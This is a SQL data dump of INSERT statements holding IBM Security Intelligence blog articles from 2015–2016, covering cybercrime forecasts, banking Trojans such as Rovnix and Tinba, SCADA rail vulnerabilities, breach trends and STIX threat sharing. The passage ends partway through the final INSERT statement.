INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (309, 'The Disconnect Between Zero-Day Exploits and Security Audits and Penetration Tests', 'Kevin Beaver', '2016-1-18', 'Given all the known security incidents and data breaches, it seems to me that the average person might be curious as to why all this nonsense is occurring, especially when periodic security testing is taking place. One would think that with all the security control audits, vulnerability scans and   in the average business, known security risks would be addressed. It’s simply not true, especially as it relates to zero-day exploits — system vulnerabilities for which there is no known fix. The complexity of the threats we face combined with the complexity of the typical network environment all but guarantees there is just no way to uncover all possible vulnerabilities and attack vectors related to advanced malware. Furthermore, the inherent nature of zero-day exploits makes those vulnerabilities unknown to begin with. It’s hard to protect against something that hasn’t yet happened. Malware-driven zero-day exploits can be so complex that not even the most in-depth technical security testing and systems oversight could uncover them. It’s a great example of the philosophy “you don’t know what you don’t know.” You can’t hit a target you can’t see. Odds are good that you’re not doing enough today to  . So what can you do? You most certainly need to keep performing your traditional security testing, but you also have to combine it with proven security controls that are layered across the enterprise. This often includes cloud access security broker technologies controlling data going out to the cloud and   at the network perimeter, as well as modern malware protection, adequate software patching and even data loss prevention at the endpoints. Arguably, your users are the best line of defense to protect against phishing and related social engineering. They can also assist in the fight against email- and browser-based attacks that facilitate zero-day exploits. If anything, ongoing security testing can serve to create a false sense of security — you think everything is OK when it’s actually not. There is no best way to combat this threat. It’s all of these security controls working in unison across the enterprise with the proper oversight that can truly protect the organization from zero-day exploits.', '\'Malware\', \'Vulnerabilities\', \'Zero-Day Attacks\'', 'https://securityintelligence.com/the-disconnect-between-zero-day-exploits-and-security-audits-and-penetration-tests/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (310, '2016 Cybercrime Reloaded: Our Predictions for the Year Ahead', 'Limor Kessem', '2016-1-15', 'Cybercrime in the past 12 months has been  . Never before have we borne witness to the magnitude or sophistication of online crime as we did in 2015. In the   by IBM and the Ponemon Institute, the average total cost of a data breach increased from $3.52 million in 2014 to $3.79 million.   said cybercrime will become a $2.1 trillion problem by 2019. That’s only three years away, and judging by the way things are going, we might get there sooner than we ever imagined. Early in the year, IBM Security   we expected to see in 2015. They included: These predictions not only materialized, but actually exceeded the forecast. We expect things to get very intense in 2016 as more organized crime groups step up their presence in the digital realms. Here is our prediction roundup covering financially motivated cybercrime for the year ahead: Although we can safely say that we see escalation in cybercrime every year, 2015 was definitely a year that stands out with respect to the scale of crime we observed. While it has been a gradual process, 2015 was the first year we saw organized cybercrime really exert its power in the digital realms. These mobs are headed by crime bosses that have troops on computers and on the streets, collecting money from mules and wiping the digital traces of their ill-begotten profits. It’s important to keep in mind that when we talk about organized cybercrime today, we are not fighting lone attackers or small factions of fraudsters anymore. Rather, we now face full-blown organizations that are organized like startup companies. They are not manned by youngsters; they employ highly experienced developers with deep knowledge that allows them to bring constant innovation into malware and attack tactics. Thus, it is no surprise that, according to  , the average age of a cybercriminal is 35 years old. Additionally, 80 percent of black-hat hackers are affiliated with organized crime, working as part of closed groups. These organizations also employ criminals other than attackers to help with the collection and moving of stolen funds, mobilizing it on the streets and laundering it along the way. Based on research that exposed the likes of  ,   or the   Trojan, it seems that cybercriminals have never been more brazen and bold in their attacks. They are stealing millions of dollars at a time compared with a five-figure magnitude in the years prior. The top offenders in the corporate fraud arena are Dyre, Dridex,   and Shifu. In 2016, we expect to see that trend persist, intensify and spread to more organized malware gangs. We also expect to see these gangs venture into new territories, as they had been doing throughout 2015. More on the   front, we predict malware adjusting attack scenarios and methods in order to circumvent the security that banks have in place. One example is the use of remote admin tools (RAT) in conjunction with a banking Trojan in order to access devices attached to the endpoint. In 2015, the Dridex Trojan used that method in some of its attacks. We also saw nonmalware device takeover, where Trojans downloaded and deployed legitimate remote assistance software and then leveraged it in fraudulent activity from the victim’s device. Dridex tested this method in September 2015. Financial cybercrime will also intensify on the targeted attacks front. In this case, we are not looking at botmasters that amass an army of zombie PCs but rather financially motivated black-hat groups that make it a top priority to target the financial institution as a high-value enterprise. Groups like   are made up of cybercriminals who take on digital crime projects that can generate hundreds of millions of dollars at a time. This group was reportedly behind the Carbanak heist and   before it. Advanced adversaries are already carrying out sporadic  . These are cases where sophisticated attackers breach the systems of enterprises and corporations with the purpose of altering data that the organization relies on. Changing the data can make the organization base decisions on incorrect information or automatically pay out invoices into the wrong accounts — those that belong to the criminals! In 2016, we expect to see more integrity attacks and see these cases cause heavy losses to the victim organizations. \n We believe this year is going to bring the game changer we’ve been expecting to discover in the mobile threats arena. Late 2015 showed the first signs of mobile malware for Android that was able to materialize the effect webinjections have on users in the PC browser: overlay malware. Overlay malware apps are one-stop fraud facilitators that steal user credentials and SMS two-factor authentication codes — right on the mobile device and at the same time. It is an account takeover facilitator par excellence, and it is quite effective. This new type of malicious app, the likes of   and  , are being sold commercially in underground cybercrime venues by a few developers who program special pop-up windows carefully adapted to the look and feel of bank applications, e-commerce apps and payment platforms. In a sense, the public sale of mobile malware in the underground in 2016 will fill the vacuum left by the banking Trojan marketplace, which has dwindled away in the past five years. Mobile malware will become commoditized in every aspect of operating a mobile botnet. Vendors offer cybercriminals the option to buy the software they need, resources to operate it and technical support they require in order to succeed in their schemes. The burgeoning overlay malware trend is especially worrying because it enables criminals to take advantage of user trust in bank applications and thus steal credentials on the mobile device when the user is already accessing the relevant app. Overlay malware is often bundled with spyware and RAT-type apps, making it much more invasive and risky to the infected users because the app exfiltrates more information from the device and allows for remote commands from the attacker. Some factors driving these threat advancements in the mobile platform include the inherent open-source and decentralized nature of the Android platform and its maturity level. These can make for   that are unearthed by researchers on a regular basis. Some argue that the Android OS is simply not a trusted environment for apps to run in — at least not yet, and especially since the responsibility for applying patches and updates is, for the most part, left to users. It would seem the more prudent approach would be to have security come from within the apps themselves, relying less on the actual platform’s security. Moreover, with Windows 10 planning to  , the acceleration of malware crossing over to Windows phones is almost guaranteed. From ransomware to other kinds of cyber extortion, cybercriminals saw their nefarious ventures soar in 2015. The Cryptolocker gang reportedly managed to   last year, proving that even the simpler malware in the wild can make criminals rich. Organized cybercrime gangs know ROI when they see it: More advanced groups have stepped into the ransomware arena in 2015, building   that forces victims to pay up. In 2016, we expect to see more ransomware groups and a higher scale of ransom demanded of victims, especially if the infected endpoint belongs to a business. We will be seeing cases where ransomware gangs hold business endpoints for a five-figure ransom. Aside from using malware to encrypt files, we also expect to see the proliferation of cyber extortion groups and methods. Black-hat attackers may demand ransoms to halt DDoS attacks or approach businesses with demands for cash after hijacking critical data from company networks. Take, for example, the case of the TalkTalk ransom fiasco. The U.K.-based telecom group fell victim to a group of criminals who gained access to the personal and financial details of up to 4 million customers. The initial ransom demand was £80,000. The ensuing damage to TalkTalk, including customer impact and lawsuits, could   in “one-off costs,” the business’s chief executive said. In 2016, we predict digital ransom attacks will become more prevalent and sophisticated by being more situationally aware — understanding victims and recognizing when attackers can fetch a higher ransom. We expect this trend to leverage   since it is the currency that criminals prefer, trusting the anonymity it affords them in ransom situations. Rise of the machine… learning! Security professionals are inundated with millions of security events. According to  , companies experienced an average of 81 million security events in 2014. Identifying false positives is getting more difficult as we process more data and strive to make timely, quality decisions based on insights from that data. In 2016,   will become a security assistant to help security professionals and data analysts cut down the noise to focus on the real threats and benefits to their organizations. On the Internet of Things (IoT) front, we expect an increase in nontraditional attack targets. We’ve already seen cars, TVs, baby monitors and gaming platforms get compromised. We will see an increase of attacks on these IoT devices. With all the attention from its closed fraud enclaves and TV shows such as “ ” and “CSI: Cyber,” the   will become less exclusive. The Dark Web is no longer the sort of venue that attracts the most advanced cybercriminal crowd. As curious, unskilled users flock to learn about the Dark Web, we anticipate it will become even more devalued for the more experienced cybercriminals, driving them further underground. Don’t be surprised when the real criminals switch over to a completely new communication channel in 2016! Beyond the existing Dark Web, the Russian-speaking venues, English-speaking zones and the Latin American underground, we anticipate the rise of new isles in Asia. For example, judging by recent events, the Japanese-speaking zones will see rising sophistication as the year progresses. Card fraud is a global problem that keeps escalating. This statement remains true even as chip-and-PIN technology is being rolled out in almost every first-world country. It’s clear that criminals are not ready to throw in the towel and give up on counterfeiting altogether despite the added hurdles they encounter in that domain. Chip-and-PIN, or the Europay-Mastercard-Visa (EMV) standard, is designed to protect cards from counterfeiting and fraud in physical scenarios. Yet this security measure is under constant attack and is also leading actors to intensify fraud in the digital channels. Since counterfeiting is that much harder with chip-enabled cards, the result is a dollar-for-dollar displacement from counterfeiting fraud to card-not-present (CNP) fraud — transactions processed online, over the phone and via mobile payments. In 2015, EMV was attacked in some creative ways. Tools for EMV replay attacks were for sale in underground boards and designed to facilitate cloning chip-protected cards issued by banks that were not checking all the relevant EMV transaction parameters. Criminals also preyed on the chip technology itself to break trust and the security embedded into payment cards. In late October 2015, a team of French researchers completed their analysis of the techniques of a criminal ring that, in 2011,  . The researchers were amazed at the sophistication of the man-in-the-middle (MitM) attack. We expect to see more crafty attacks on EMV technology in 2016 as criminals continue to push for a way to exploit this payment method. Point-of-sale (POS) malware is also expected to push for more modularity and sophistication. This escalation will result from well-funded gangs investing in the development of POS malware. After seeing the proven success of POS malware in the past few years, organized cybercrime will not hesitate to invest in building this sort of malware, and we forecast seeing more persistent, stealthy and highly modular POS malware in 2016. On the more physical side of carding fraud, we expect to see the use of skimmers die down. Instead, be prepared for a rise in the use of   that can record the card’s magnetic stripe and its chip data. Many organizations are already looking to biometrics-based solutions to better authenticate customers and provide them with services in a more secure manner. While biometrics is a more advanced identifier, it is still being stored and managed on the same hardware that can be  . Furthermore, biometric data has not yet broadly seen adequate security or safe processing applied to its repositories. For example, the U.S. Office of Personnel Management (OPM) breach resulted in the theft of  , and the biometrics were stolen alongside extensive data on each person. Biometric data is also being traded in ways that its owners never intended. For example, DNA data from newborn blood samples in California was  . How was that data transferred to the buyers? Did the parents know the data was being sold? How is that data being protected by the third parties who bought it, and who else can they sell it to? We expect to see biometric data exploited in fraud scenarios in 2016. Overall, biometrics requires adequate security and processes in order to materialize its promise as better authentication. One example is voice biometrics. Voice biometrics is the most mature and widespread biometric identification model at this time. To guard its authenticity, security researchers and developers will have to consider mobile malware that can intercept calls, record voices and exfiltrate voice samples to an attacker. The possibility that voice patterns can be stolen means that we cannot trust voice biometrics as the sole authenticator of the genuine customer. In 2015, we started seeing the emergence of targeted attack tools and methods in the realms of financially motivated cybercrime. Phenomena like  , which was first discovered when the Stuxnet worm was exposed, became an everyday occurrence with banking Trojans, POS malware and even ransomware. Cybercriminals picked up   such as leveraging a poisoned remote assistance tool for remote-controlling infected endpoints and using them against businesses.  potentially catalyzed black-hat capabilities in the cybercrime arena in 2015, allowing criminals to obtain rare and effective exploits to use in their everyday schemes. The leak reportedly facilitated the work of Chinese cybercriminals who targeted a financial firm in the U.S. by   leaked from that same breach.', '\'Cybercrime\', \'Dark Web\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/2016-cybercrime-reloaded-our-predictions-for-the-year-ahead/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (311, '2015: An Eventful Year in Cybersecurity', 'Lyndon Sutherland', '2016-1-13', '2015 was a very interesting year. As you likely recall, 2014 was considered by many to be the year of the data breach. 2015 saw plenty of action, but nothing like the huge retail point-of-sale (POS) breaches we saw in late 2013 and early 2014. This past year, by contrast, we witnessed the   — formerly on the sidelines of the cyber war — become a prime target. In fact, five of the eight largest health care security breaches of the last five years happened during the first six months of 2015.\n There were also some breaches of significance not due to the number of users affected, but for their ongoing ramifications. One example is the breach of the U.S. Office of Personnel Management (OPM). Over time, the number of people who might have been affected by the breach grew to more than 22 million,   reported. It is not just the number of users but the depth of the information the attackers obtained through the breach that is of concern. The compromised information may have included detailed data from security clearance and background checks, even fingerprints.\n Then there was the breach of the company Hacking Team, which creates and sells surveillance software. This not only provided information on the company and its customers (which included governments), but also unleashed multiple zero-day exploits for Adobe Flash Player on the world,   reported. They appear to have been created by the company for use in its offensive software products.\n Then there’s the infamous  , which was of great public interest simply due to the site’s purpose. The details of more than 30 million users were obtained by the attackers and then published online, creating more than a little discomfort for many users who would probably have preferred their information remained private.\n Due to the nature of the Ashley Madison site and the information, there were also attempts to extort money from victims of the   by claiming the details could be removed for a fee or threatening to forward the user information to third parties unless the extortionist was paid.\n Speaking of extortion, 2015 also saw significant extortion-related activity.   such as Cryptowall had a big year, possibly due to exploit kits that reduced the level of skill required by an attacker to carry out such an attack. There was also an increase in the use of threats such as   to extort money from victims. At the beginning of 2015, the name DD4BC was perhaps most commonly connected with these attacks.\n But as the year progressed, a new name — Armada Collective — emerged as the one most associated with DDoS attacks. The basic attack methodology remains the same, but there is a variance in the delivery mechanisms and content of the threatening messages that use the Armada Collective name. The attacks have been targeting financial institutions and are not limited to a single geography. This suggests that there may be multiple entities operating under a single moniker.\n Last year, when we looked at vulnerabilities through 2014, it was easy to pick two as the year’s most significant:  . While there was no shortage of vulnerabilities in 2015, we didn’t see any on that level. However, one product stood out this year: the ubiquitous   Flash Player.\n In December alone, Adobe patched almost 100 vulnerabilities in Flash. While Adobe is responsive and provides fixes promptly for vulnerabilities brought to its attention, it is not uncommon for flaws to be discovered only when they’re being exploited in the wild.\n Of course, vulnerabilities can lead to malware, and 2015 had a lot of activity from malware used to  . We shouldn’t forget the age-old spam and scam issues. What changed through 2015 with these threats? Well, not a lot, really — there was more evolution and refinement.   and links in emails are still utilized by attackers to infect systems or direct victims to malicious URLs. Spear phishing remains one of the more successful vectors used to breach companies.\n You’ve probably read plenty of articles providing predictions for the cybersecurity landscape in 2016. Rather than attempt to predict the future, I’d prefer to offer some simple advice to help  :\n Sounds easy, doesn’t it? But these simple steps truly can be the difference between investigating an alert versus investigating a breach.', '\'Cybersecurity\', \'Data Breach\', \'Data Protection\', \'Ransomware\', \'Security Intelligence\', \'X-Force\'', 'https://securityintelligence.com/2015-an-eventful-year-in-cybersecurity/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (312, 'Loco Motives? Hacker Attacks Could Derail Train Cybersecurity, Researchers Say', 'Douglas Bonderud', '2016-1-12', 'It’s hard to argue with efficiency in tech or transportation. Despite the availability of air freight and commercial trucking services, trains stand out as both efficient and cost-effective when it comes to moving large quantities of material goods. According to  , however, the supervisory control and data acquisition network (SCADA) systems used by many rail companies are vulnerable to hacker attacks, paving the way for a kind of cyber train robbery. But are cybercriminals really motivated to follow this track? And if so, what’s the impact for SCADA solutions at large?  are an integral part of many enterprise systems, primarily in the energy generation and  . Historically, these systems have been good enough to secure critical components since money-motivated hacking groups had very little to gain by messing with power grids or impacting oil production. The rise of nation-sponsored and ideologue-based hacktivism, however, has changed the game. Now, malicious actors may target these facilities in an attempt to drive political change or because they’re being paid by groups with specific global or national agendas. As noted by  , the energy sector now faces the legacy of poorly secured SCADA systems and is playing catch-up as it hunts down specific — and often critical — vulnerabilities. But energy companies aren’t the only ones using SCADA. Manufacturing firms often leverage these systems to keep track of production timelines and maintenance issues, while rail companies use SCADA to manage traffic control, crossing protection and switching yard automation. Just like their  , these systems are vulnerable to hacker attacks under the right conditions. The basic principles of train operation haven’t changed. Steel wheels still roll on tracks, driven by enormous engines with a single purpose: pull. As noted by the SecurityWeek piece, however, the back-end   supporting this aim has evolved significantly. Digitally controlled signals have replaced human-operated points, while electronic passenger protection and information systems have made both occupying and operating trains a much safer, more enjoyable experience. According to  , however, a team of researchers from German security firm SCADA Strangelove has spent the last three years working with train companies across the globe to assess SCADA flaws. The results? These systems are not OK. At the 32nd Chaos Communications Conference (32C3), the research team rolled out a new paper titled “ .” It found a number of high-level security and safety issues: For example, some digital train switches need constant Internet access. If the signal is lost, trains automatically stop. A few systems also use default passwords on admin accounts even for high-level functions. SCADA Strangelove went into more detail. Consider the use of WinAC RTX controllers as part of train protection systems by many European companies. It’s possible to control these devices without authentication or to use XML over HTTP to create malicious modification tools for the device. Hacking computer-based interlocking (CBI) systems, meanwhile, gives malicious actors the ability to control train routes and schedules, in turn allowing them to ransom back control or attempt to force a crash. There’s also the problem of passwords. In addition to keeping admin passwords intact, the research team found that password data was often publicly available. One U.K. documentary about the country’s rail system included a shot that captured login details written on a post-it note. Even in cases where technology is secure, such as SIM cards, it’s possible for hacker attacks to take place using a GSM jammer, which would disrupt communications between trains and their control stations. The SCADA Strangelove researchers admit that in many cases, these hacks would require intimate knowledge of the SCADA system or the help of someone on the inside, either as a malicious accomplice or an inadvertent insider through the use of social engineering. As noted by  , however, the idea of hacked trains isn’t exactly far-fetched. In early December 2015, a Massachusetts Bay Transportation Authority (MBTA) train departed without an operator and coasted through four stations before coming to a stop. While no details have been released on exactly what caused the issue, the specter of hacking has already emerged, and with thousands of commuters riding the MBTA each day, digital vulnerabilities could have serious physical impact. Bottom line? Hacker motives are changing. It’s no longer about the quick smash-and-grab; many malicious actors are looking for ways to wreak real havoc or acting on the instructions of a politically motivated nation-state. And what motivates governments and large corporations to change their ways?  . With SCADA systems acting as an integral part of everything from energy to manufacturing and transportation, it’s no surprise that cybercriminals are learning to leverage vulnerabilities and discover just what kind of damage they can cause. This isn’t a runaway freight train situation just yet. With proper monitoring, better detection and a realization that most existing systems aren’t up to the challenge, it’s possible to get SCADA back on track.', '\'Cyberattacks\', \'Cybercrime\', \'Energy and Utilities\', \'Hacktivism\', \'SCADA\'', 'https://securityintelligence.com/loco-motives-hacker-attacks-could-derail-train-cybersecurity-researchers-say/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (313, 'Konnichiwa, Rovnix! Aggressive Malware Hits Japanese Banks', 'Limor Kessem', '2016-1-7', 'IBM X-Force researchers have discovered that the cybercrime gang operating the Rovnix Trojan has launched an aggressive new infection campaign in Japan. Rovnix is the latest advanced malware to set its sights on Japan. Before it came the  , which initiated attacks in Japan in August 2015. The gang that operates Rovnix is known to focus on European banks, but its current campaigns in Japan are nothing short of an onslaught, with 14 major brands on the target list. The infection campaigns, the first of which appeared in  , leverage malware-laden email messages, delivering Rovnix’s downloader concealed inside benign-looking .zip attachments. The spam itself comes from email addresses on .ru domains. It uses one of the most common ploys: a package delivery from international transport companies, urging recipients to open a waybill (Figure 1, below). That unwitting action covertly launches Rovnix’s downloader from the archive .zip attachment. According to IBM X-Force researchers, Rovnix came to the Japanese battlefield highly prepared, with crafty email spam written in Japanese and a hefty configuration file that was fully and uniquely adapted to attack major banks. Inside Rovnix’s Japan-specific configuration, our researchers have found attack schemes tailored to each targeted bank. The schemes leverage an infrastructure of external scripts that call on Rovnix’s elaborate webinjections. \n The injection mechanism used by Rovnix is a commercial offering that was sold to cybercriminals in the underground by a developer who specializes in creating injections that perfectly mimic the look and feel of the targeted bank’s Web pages. They even adapt the flow of events to the target’s authentication scheme. The webinjections facilitate the display of social engineering content on the bank’s Web pages as viewed from the infected user’s browser. For each bank, the injections used by Rovnix modify large parts of the original page, which is designed to trick the victim into divulging the second password or token for the ensuing fraudulent transaction. In some cases, Rovnix further deploys injections that instruct victims to download an Android app onto a mobile device. That app contains Rovnix’s SMS hijacker. The Rovnix in the mobile app will then listen for incoming SMS messages containing transaction authorization codes from the bank. The mix of language-specific social engineering and mobile malware proves that the gang behind Rovnix has adequately prepared for the campaigns with all the necessary means for defrauding Japanese victims. Rovnix’s operators come to Japan at a time when attacks from Shifu seem to have died down. While it is not clear why the Shifu gang has slowed down its attacks in Japan, the territory still appears ripe and lucrative to other organized cybercrime gangs hailing from Eastern Europe. Thanks to its bootkit feature, Rovnix is considered to be a highly persistent malware. In terms of Rovnix’s ranking on the global malware list this year,   data shows that Rovnix has climbed into the top 10 global malware list after the botnet takedown of NGRbot (aka DorkBot). Rovnix’s global reach is limited when compared with other malware like Dyre or Neverquest because it usually focuses attacks on one country at a time. The chart below shows Rovnix’s ranking among the top offenders on the financial malware roster for the year of 2015 based on IBM Trusteer data. At the time of this writing, the   analyzed by IBM X-Force is only properly detected as Rovnix by four antivirus vendors out of 54, or 7 percent. Up until 2015, Japan was relatively protected from the banking Trojan revolution that has been affecting banks since the early 2000s thanks in large part to its language. That grace period came to an end when organized cybercrime, with ample funding for a new project, emerged in the Asia-Pacific region. Starting in the summer of 2015, Japan began seeing some of the world’s most sophisticated banking Trojans attack banks in the country. From Japan-focused codes such as   to the highly modular Shifu and now Rovnix, it is clear that the Japanese financial sector is under attack. It is now recognized as a lucrative target to cybercriminals from Japan and Eastern Europe. IBM X-Force researchers expect Rovnix to continue its attacks in Japan and intensify campaigns in the country. We also expect to see other privately held malware gangs from within the country and Eastern Europe target financial entities in Japan. IBM Security Trusteer has worked with customers to study and stop Rovnix attacks and can be of help to banks that wish to learn more about this high-risk threat. To stop threats like Rovnix, banks and service providers can use adaptive solutions to detect infections and   when malware migrates or finds new focus in your region. On the bank’s side, fighting evolving threats like Rovnix’s bootkit variants is made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from malware intelligence that provides real-time insight into fraudster techniques and capabilities.', '\'Advanced Threats\', \'Banking Trojan\', \'IBM X-Force Research\', \'Malware\', \'Rovnix\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/konnichiwa-rovnix-aggressive-malware-hits-japanese-banks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (314, 'Mitigating Malware in a Modern, Mobile World', 'Limor Kessem', '2016-1-1', ', malicious programs, phishing and other forms of internet-borne malice are ever-evolving risks that keep escalating in numbers and sophistication. With that, most threats still need user interaction to help usher them into a PC or mobile endpoint. This is where anyone can apply some extra precautions to safeguard against the latest cybercrime schemes.   Most cases of PC malware infections begin with spam email that tricks victims into navigating to a spoofed URL or opening a malicious attachment. If you are not expecting a document, such as an invoice, package tracking link or fax, your best bet is to immediately delete the unsolicited message and alert your IT department as well as your bank or other service provider. Those who frequently conduct online banking away from home should never access personal accounts from public computers. Online banking should be carried out from trusted or secured Wi-Fi networks, over a secured VPN connection and through devices protected by security solutions. Stay away from unsolicited email. Seriously. No matter how tempting a subject, if you did not solicit it, did not make a purchase and were not expecting an invoice or package, report it as spam to your IT department. Then send it to the abuse mailbox of the applicable service provider and delete it from both your inbox and the trash folder. Be especially wary of attachments and examine them for their true extension type. Most malware is actually an executable, like an .exe file; a container file, like .zip or .rar; or an Office spreadsheet or document with macros that, in some cases, run automatically. Don’t let that happen. Email is not a bulletproof communication method. In fact, it’s the favored method by which phishers, spammers and other cybercriminals spread their malicious schemes. These bad actors are determined to come up with a way to make you open and click, so don’t take the bait. Some additional computing hygiene tips can go a long way toward helping users protect themselves from run-of-the-mill malware: The average person looks at his or her phone 46 times every day, according to  . As for banking with our phones,   reported that 38 percent of consumers interact with a bank primarily via a mobile device, and 63 percent use phones to carry out standard banking tasks. That means mobile banking is being used more than ever before. With users migrating their everyday banking to mobile devices, cybercriminals are taking advantage of the increased opportunities to dupe them into opening malicious messages and emails, clicking on evil links or downloading innocuous-looking apps from dubious sources. Users can foil most of these attacks by keeping in mind some familiar tips for mitigating malware:', '\'Best Practices\', \'Data Protection\', \'Email\', \'Malware\', \'Mobile Devices\', \'Mobile Security\', \'Phishing\', \'Ransomware\', \'Smartphones\', \'X-Force\'', 'https://securityintelligence.com/mitigating-malware-modern-mobile-world/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (315, 'Sharing Threat Information Is Easier With STIX', 'Larry Loeb', '2015-12-29', 'In the past, security professionals have had a problem sharing threat information with other enterprises. Like a modern-day Tower of Babel, there hasn’t been a good way that information about threats can be easily communicated. The first step in information sharing is selecting the right communication platform. For instance, organizations concerned about application security may want to consider the  . This program allows users to talk to each other to gain a new perspective, and the featured apps and add-ons in the exchange can enhance security in specific threat situations. But there is more here than just handy tips to be found out in the wild. A new IBM-developed app present in the App Exchange lets users of certain security solutions pull in any threat intelligence feed that uses the open-standard STIX and   formats, which were developed in 2012. It can also use data to create custom rules for correlating, searching or reporting on issues. For example, users could bring in public collections of dangerous IP addresses and create a rule to raise the magnitude of any offense that includes IP addresses from that watch list.  is a language for describing cyberthreat information in a standardized and structured manner. STIX characterizes an extensive set of cyberthreat information, including indicators of adversary activity (e.g., IP addresses and file hashes) as well as additional contextual information regarding threats such as adversary tactics, techniques and procedures, exploitation targets, campaigns and courses of action. Together, this data more completely characterizes the cyber adversary’s motivations, capabilities and activities. Given this kind of information, a decision can be made on how to best defend against the threat. It is intended to support both more effective analysis and the continued exchange of cyberthreat information. The initial development of STIX concentrated on indicators, but there were   needs beyond this. STIX was then broadened to include related threat and mitigation information. STIX provides a common mechanism for addressing structured cyberthreat information across and among this full range of use cases. It is designed for improving consistency, efficiency, interoperability and overall situational awareness. It can be used for cyberthreat analyst reviews involving structured and unstructured information on cyberthreat activity from a variety of manual or automated input sources. The language can specify measurable indicator patterns representing the observable characteristics of threats. It shows the threat context and relevant metadata needed for interpreting and handling the information.  is helpful for investigating and responding to detected incidences of threat activity. Preventative courses of action may then be developed to mitigate vulnerabilities, weaknesses or misconfigurations targeted by exploits. At its core, STIX is a community-driven effort to provide a threat representation that adheres to the guiding principles of maximizing expressivity, flexibility, extensibility, automatability and readability. STIX provides expressive coverage of the full spectrum of cyberthreat information: observables, indicators, incidents, exploit targets, courses of action, threat actors and campaigns, just to name a few. Anyone who is conversant in XML or Python will find STIX to be understandable and useful.', '\'Information Sharing\', \'STIX\', \'TAXII\', \'Threat Intelligence\'', 'https://securityintelligence.com/sharing-threat-information-is-easier-with-stix/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (316, 'Attackers Shift Sights From Retail to Health Care in 2015', 'Caleb Barlow', '2015-12-24', 'During the holiday season just a few years ago, major retailers were in a panic responding to countless attacks from cybercriminals targeting their highly coveted customer credit card information. It’s likely that you were personally impacted by those high-profile breaches, or if not, you know someone close to you who was. IBM’s X-Force security researchers analyzed   from the first 11 months of 2015 and have identified some interesting shifts in criminal behavior. Surprisingly, companies are reporting significantly fewer compromised retail records in 2015, down 96 percent from 2013. Comparing 2014 to 2015, there’s a 92 percent decrease — we’re currently at a four-year low, with only 5.7 million compromised records reported. For starters, cybercriminals are extremely sophisticated. They go where the valuable data is. While it’s true that retail information is valuable, the expiration date starts ticking immediately as banks focus on detecting and shutting down compromised cards. That’s why it’s no surprise we have seen a dramatic shift as attackers focus on an even more valuable target:  . In 2015, there was a tremendous uptick in the theft of health care data. We have seen a 1,166 percent increase in reported health care records breached from 2014 to 2015. In fact, nearly 100 million health care records were compromised in 2015. There are 321 million people in the U.S., so this equates to roughly 1 in every 3 people in the country, which is actually where the majority of the health care records were stolen. \n There are many ways organizations within the   can protect their valuable information. It starts by having security teams: If you have more questions about cybersecurity in   and the  , download two recent reports from IBM’s Managed Security Services team. Whether confronting why   or examining the  , this information can be vital to understanding the cyberthreats facing an enterprise.', '\'Cybercrime\', \'Data Breach\', \'Healthcare Data Breach\', \'Healthcare Industry\', \'IBM X-Force Research\', \'Retail\', \'X-Force\'', 'https://securityintelligence.com/attackers-shift-sights-from-retail-to-health-care-in-2015/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (317, 'I’m Yelling Tinba! Trojan Sets Sights on Singapore Banks for Holiday Season', 'Limor Kessem', '2015-12-23', 'IBM X-Force malware researchers have uncovered an aggressive malware campaign targeting banks in Asia. The campaign, which uses the Tinba v3 banking Trojan to infect potential victims, has its sights set on business and corporate accounts held with nine major bank brands in Singapore. While other countries are also targeted, the amount of Singaporean bank brands on the malware gang’s list top the chart. The country accounts for more than one-third of all targeted brands. \n The second half of 2015 has revealed a strong attack trend on high-value accounts of all types as cybercrime gangs attempt to diversify the sources they target and increase the amount of money they steal in each illicit transaction. This trend seems to indicate that more gangs than ever have set up the necessary infrastructure to launch such attacks and successfully make large transfers to offshore accounts. Tinba v3 is known to be operated by a gang that uses three principal configurations to attack different regions in the world. The configuration currently targeting Singaporean banks is Asia-specific and has been further adapted to harvest user credentials for business and corporate accounts. In that same configurations file, the list of targeted URLs includes online trading sites, personal account credentials and credentials to access the accounts of users who browse to Singapore’s principal credit bureau. \n Researchers have previously reported on the  . It had been through several different configurations before this latest discovery, including a recent version that  . Tinba’s most common infection method is through the Angler exploit kit, with users lured via malvertising campaigns. This infection approach is especially insidious because it can compromise popular, legitimate websites and serve poisoned ads. The infection itself is a drive-by download that takes place automatically and without the user ever seeing it occur. Tinba v3 attacks online banking customers in different geographies, with a dedicated configuration for each region — namely North America, Australia and New Zealand, Europe and Asia. In terms of Tinba’s proliferation this year, IBM X-Force data shows that this malware is ranked sixth, right after  , which is considered a semicommercial malware. At the time of writing, IBM X-Force malware researchers noted that the Gozi ISFB code version was leaked online; they expect it to become widely used by cybercriminals within the coming months. The chart below shows the top offenders on the financial malware roster for 2015 so far. \n Based on other IBM X-Force research into Tinba v3 campaigns, we expect to see this malware variation give special attention to the Southeast Asia region. Tinba v3 campaigns are bound to raise the infection rates in the region and will result in an increase of fraudulent transactions for bank customers. We recommend that banks alert their customers and refresh the online banking security sections on their websites. Users can mitigate the risk by: IBM Security Trusteer has worked with customers to study and stop Tinba attacks. It can help banks that wish to learn more about this high-risk threat. To stop threats like Tinba, banks and service providers can use adaptive solutions to detect infections and   when malware migrates to or refocuses in their region. Fighting evolving threats like Tinba variants is made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from IBM Security’s malware intelligence to provide real-time insight into fraudster techniques and capabilities.', '\'Banking Trojan\', \'Malvertising\', \'Malware\', \'Tinba\', \'Trojan\', \'X-Force\'', 